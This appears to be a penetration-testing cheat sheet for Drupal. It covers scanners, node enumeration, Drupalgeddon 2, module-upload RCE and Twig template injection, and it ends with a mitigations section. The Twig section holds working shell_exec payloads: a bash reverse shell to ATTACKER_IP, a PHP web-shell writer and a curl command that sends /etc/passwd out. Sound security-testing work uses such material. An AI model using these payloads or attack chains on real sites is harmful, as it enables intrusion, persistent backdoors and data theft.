## 1. Overview

Drupal is a powerful Content Management System (CMS) that can contain various security vulnerabilities across different versions. Key testing areas include:

- **Node Enumeration:** Hidden development/test pages accessible via `/node/$NUMBER`
- **Authenticated RCE:** Remote Code Execution through module uploads and Twig template injection
- **Information Disclosure:** Username enumeration on older versions
- **Version-Specific Exploits:** Critical vulnerabilities in Drupal 8.x and 9.x versions

**Key Insight:** Drupal sites often expose non-production content through predictable node IDs, making enumeration a high-value testing strategy.

---

## 2. Exploitation Methods

### 🔍 Phase 1: Reconnaissance & Enumeration

#### Automated Scanning Tools

**droopescan** - Drupal-specific scanner

```bash
# https://github.com/droope/droopescan
droopescan scan drupal -u https://example.com -t 32
```

**drupwn** - Comprehensive enumeration and exploitation

```bash
# https://github.com/immunIT/drupwn
sudo python3 drupwn --mode enum --target https://example.com
sudo python3 drupwn --mode exploit --target https://example.com
```

**CMSScan** - Multi-CMS scanner with Drupal support

```bash
# https://github.com/ajinabraham/CMSScan
docker build -t cmsscan .
docker run -it -p 7070:7070 cmsscan
python3 cmsmap.py -f D https://www.example.com -F
```

**CMSeeK** - CMS detection and exploitation

```bash
# https://github.com/Tuhinshubhra/CMSeeK
python3 cmseek.py -u domain.com
```

#### Manual Node Enumeration

**Critical Technique:** Fuzz node endpoints to discover hidden pages

```bash
# Use Burp Intruder or similar tool
# Target: /node/$
# Payload: Numbers 1-500 (or higher based on site size)
# Look for: 200 OK responses with dev/test/staging content
```

**Why This Works:** Drupal nodes are sequential, and developers often create test content that isn't linked publicly but remains accessible.

---

### 🚀 Phase 2: Authenticated Exploitation

#### Drupal < 8.7.x - Module Upload RCE

**Vulnerability Reference:**

- https://www.drupal.org/project/drupal/issues/3093274
- https://www.drupal.org/files/issues/2019-11-08/drupal_rce.tar_.gz

**Attack Steps:**

1. Obtain authenticated access (admin or privileged user)
2. Navigate to module upload functionality
3. Upload malicious module package
4. Execute remote commands

#### Drupal < 9.1.x - Twig Template RCE

**Vulnerability Reference:**

- https://www.drupal.org/project/drupal/issues/2860607

**Step-by-Step Exploitation:**

1. **Access Views Administration**
    - Requires "Administer views" permission
2. **Create Malicious View**
    - Create new View of User Fields
    - Add a "Custom text" field
3. **Inject Twig Payload**

```twig
{{ {"#lazy_builder": ["shell_exec", ["touch /tmp/hellofromviews"]]} }}
```

4. **Trigger Execution**
    - Save and display the view
    - Verify command execution (check `/tmp/hellofromviews`)

**Command Customization Examples:**

```twig
# Reverse shell
{{ {"#lazy_builder": ["shell_exec", ["bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"]]} }}

# Web shell creation
{{ {"#lazy_builder": ["shell_exec", ["echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php"]]} }}

# Data exfiltration
{{ {"#lazy_builder": ["shell_exec", ["cat /etc/passwd | curl -d @- http://ATTACKER_IP/exfil"]]} }}
```

---

### 📊 Phase 3: Information Gathering

#### Username Enumeration (Older Versions)

**Endpoint to Test:**

```bash
# Check for autocomplete functionality
?q=admin/views/ajax/autocomplete/user/a

# Enumerate usernames by testing different letters
?q=admin/views/ajax/autocomplete/user/b
?q=admin/views/ajax/autocomplete/user/c
```

**What to Look For:** JSON responses containing valid usernames for password attacks

---

### ⚡ Drupal 8 Specific Exploits

**Drupalgeddon 2 (CVE-2018-7600)**

```bash
# Exploit reference
# https://www.exploit-db.com/exploits/46459

# Remote Code Execution without authentication
# Affects Drupal 7.x and 8.x versions before patches
```

**Testing Steps:**

1. Identify Drupal 8 installation
2. Check version number (< 8.5.1 vulnerable)
3. Deploy public exploit or use Metasploit module
4. Achieve unauthenticated RCE

---

## 3. Higher Impact Scenarios

### 🎯 Critical Attack Chains

**Scenario 1: Guest → Administrator → System Compromise**

```
1. Username enumeration → Valid admin account
2. Password attack → Authenticated access
3. Twig template injection → Web shell
4. Privilege escalation → Full system control
```

**Scenario 2: Node Discovery → Data Breach**

```
1. Node fuzzing → Hidden dev/test pages
2. Exposed sensitive data → API keys, credentials
3. Lateral movement → Backend systems access
```

**Scenario 3: Module Upload → Persistent Backdoor**

```
1. Compromised admin credentials
2. Malicious module upload with backdoor
3. Persistent access even after password reset
4. Long-term data exfiltration capability
```

---

## 4. Mitigations

### 🛡️ Defense Strategies

**For System Administrators:**

1. **Keep Drupal Updated**
    
    - Apply security patches immediately
    - Monitor https://www.drupal.org/security
    - Enable automatic security updates when possible
2. **Node Access Controls**
    
    - Delete unused test/dev content
    - Implement proper access controls on node visibility
    - Use unpredictable node IDs if custom implementation
3. **Restrict Template Permissions**
    
    - Limit "Administer views" permission to trusted users only
    - Disable Twig debugging in production
    - Review custom templates for injection vulnerabilities
4. **Module Security**
    
    - Only install modules from trusted sources
    - Regularly audit installed modules
    - Remove unused/deprecated modules
5. **Authentication Hardening**
    
    - Disable username enumeration endpoints
    - Implement rate limiting on login attempts
    - Use strong password policies
    - Enable two-factor authentication
6. **Monitoring & Logging**
    
    - Monitor for suspicious node access patterns
    - Log module installations/changes
    - Alert on failed authentication attempts
    - Review logs for Twig injection attempts

---

## 📋 Quick Testing Checklist

- [ ] Run automated Drupal scanner (droopescan/drupwn)
- [ ] Enumerate nodes (1-500+) for hidden content
- [ ] Test username enumeration endpoint
- [ ] Identify Drupal version
- [ ] Check for known CVEs matching version
- [ ] If authenticated: Test Twig template injection
- [ ] If authenticated: Test module upload functionality
- [ ] Document all findings with screenshots/proof

**Pro Tip:** Start with node enumeration—it's quick, low-noise, and often reveals unexpected sensitive data! 🚀